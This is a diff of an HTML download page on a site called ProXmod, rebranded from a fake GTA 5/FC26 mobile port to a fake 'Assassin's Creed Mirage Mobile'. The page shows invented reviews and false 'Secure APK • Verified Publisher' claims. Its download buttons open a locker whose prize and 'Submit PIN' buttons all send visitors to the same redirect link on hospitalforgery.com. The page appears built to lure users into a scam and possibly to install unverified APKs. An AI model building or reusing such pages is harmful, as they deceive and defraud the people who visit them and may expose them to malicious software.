@@ -3,37 +3,36 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>FC26 - Download Now | ProXmod</title>
+  <title>Assassin's Creed Mirage | ProXmod</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
   <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@600;700&family=Roboto:wght@400;500;600&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="../style/game.css">
+  <link rel="stylesheet" href="../../style/game.css">
 </head>
 <body>
 
   <!-- HEADER -->
   <header class="header">
-    <a href="../index.html" class="back-icon">
+    <a href="https://mod.skygamestudio.xyz/" class="back-icon">
       <i class="fas fa-arrow-left"></i> Back to Home
     </a>
   </header>
 
   <!-- HERO -->
   <div class="hero">
-    <img src="https://i.postimg.cc/wv6VYBwd/446de05af784f1c588d15d447a3b4bd3.jpg" alt="FC26 Mobile Cover">
+    <img src="https://i.postimg.cc/DzdYVcwp/acm-page-meta-960x540.avif" alt=" Cover">
   </div>
 
   <div class="container">
 
     <!-- GAME INFO -->
     <div class="game-info">
-      <img src="https://i.postimg.cc/N0QG6hNG/3206dd46cb3cb8b2b8377119d199ed08.jpg" alt="FC26 Logo" class="game-icon">
+      <img src="https://i.postimg.cc/rwRJTNQ1/mirage.jpg" alt="Logo" class="game-icon">
       <div class="game-details">
-        <h1>FC26 Mobile</h1>
-        <small>The Ultimate fifa 2026 Mobile</small>
+        <h1>Assassin's Creed Mirage</h1>
+        <small>The Ultimate Assassin's Creed Mirage Mobile</small>
       </div>
     </div>
 
-    <!-- DOWNLOAD BUTTONS -->
     <div class="download-section">
       <button class="download-btn" onclick="openLocker('android')">
         <i class="fab fa-android"></i> Download for Android
@@ -65,7 +64,7 @@
           <li>Install the APK file</li>
           <li>Place the OBB folder inside Android/obb/</li>
           <li>Launch the game and grant storage permissions</li>
-          <li>Enjoy GTA 5 on mobile!</li>
+          <li>Start your epic journey with us</li>
         </ul>
         <ul class="install-steps" id="ios-steps" style="display:none">
           <li>Download the signed IPA via the iOS button above</li>
@@ -115,9 +114,9 @@
     <div class="section-block">
       <h2 class="section-title"><i class="fas fa-images"></i> Screenshots</h2>
       <div class="screenshot-scroll">
-        <img src="https://i.ibb.co/gFW38v3D/gta6.jpg" alt="Screenshot 1" class="screenshot">
-        <img src="https://i.ibb.co/3yzhZw5v/gta4.jpg" alt="Screenshot 2" class="screenshot">
-        <img src="https://i.ibb.co/VpSJgx2h/gta5.jpg" alt="Screenshot 3" class="screenshot">
+        <img src="https://i.postimg.cc/xCN5fyfY/hq720.jpg" alt="Screenshot 1" class="screenshot">
+        <img src="https://i.postimg.cc/26LGkFkr/Assassins-Creed-Mirage.webp" alt="Screenshot 2" class="screenshot">
+        <img src="https://i.postimg.cc/1XxHfnXs/c8534d9ae3b6b27c617f0bddc6576e7ca70730e267b2db70.avif" alt="Screenshot 3" class="screenshot">
       </div>
     </div>
 
@@ -200,12 +199,12 @@
             <div class="cl-brand-dot"><i class="fas fa-cloud"></i></div>
             <span>MediaFire</span>
           </div>
-          <img src="https://i.pinimg.com/1200x/68/62/23/68622382616c1e5ec1546a45035c77a5.jpg" class="cl-banner-bg" alt="">
-          <img src="https://i.postimg.cc/wv6VYBwd/446de05af784f1c588d15d447a3b4bd3.jpg" class="cl-banner-icon" alt="GTA 5">
+          <img src="https://i.postimg.cc/DzdYVcwp/acm-page-meta-960x540.avif" class="cl-banner-bg" alt="">
+          <img src="https://i.postimg.cc/rwRJTNQ1/mirage.jpg" class="cl-banner-icon" alt="GTA 5">
         </div>
 
         <div class="cl-title-row">
-          <h3 id="clGameTitle">Download GTA 5 Mobile</h3>
+          <h3 id="clGameTitle">Download Assassin's Creed Mirage Mobile</h3>
           <p><i class="fas fa-check-circle"></i> Secure APK &bull; Verified Publisher</p>
         </div>
 
@@ -271,10 +270,10 @@
 
     /* ── Reviews (localStorage) ── */
     const DEFAULT_REVIEWS = [
-      { name:'Alex M.',   rating:4, text:'Amazing port! Runs smooth on my device. Best mobile gaming experience.', date:'2 days ago' },
+      { name:'Ahmed M.',   rating:4, text:'Amazing port! Runs smooth on my device. Best mobile gaming experience.', date:'2 days ago' },
       { name:'Jordan K.', rating:5, text:'Full Los Santos on mobile! Controls take some getting used to but worth it.', date:'1 week ago' }
     ];
-    const STORAGE_KEY = 'yazone_gta5_reviews';
+    const STORAGE_KEY = 'sky_creed_reviews';
 
     function buildReviewEl(r) {
       const stars = Array.from({length:5},(_,i) =>
@@ -367,7 +366,7 @@
 
       /* Update title */
       document.getElementById('clGameTitle').textContent =
-        'Download GTA 5 Mobile' + (platform === 'ios' ? ' (iOS)' : ' (Android)');
+        'Download Assassin Creed Mirage' + (platform === 'ios' ? ' (iOS)' : ' (Android)');
 
       /* Show overlay */
       document.getElementById('clOverlay').classList.add('show');
@@ -400,7 +399,13 @@
       btn.classList.remove('dimmed');
       btn.style.opacity = '1';
       btn.style.boxShadow = '0 0 22px rgba(0,229,200,0.6)';
-      window.open('https://hospitalforgery.com/h16wsdgz9c?key=8d5180db54c095210791457ef5c520ed', '_blank');
+      const links = {
+        'Win a Samsung S25!'              : 'https://hospitalforgery.com/h16wsdgz9c?key=8d5180db54c095210791457ef5c520ed',
+        'Submit PIN to enjoy the best game!' : 'https://hospitalforgery.com/h16wsdgz9c?key=8d5180db54c095210791457ef5c520ed',
+        'Win Airpods Max!'                : 'https://hospitalforgery.com/h16wsdgz9c?key=8d5180db54c095210791457ef5c520ed'
+      };
+      const url = links[btn.textContent.trim()];
+      if (url) window.open(url, '_blank');
     }
 
     /* Close on backdrop click */
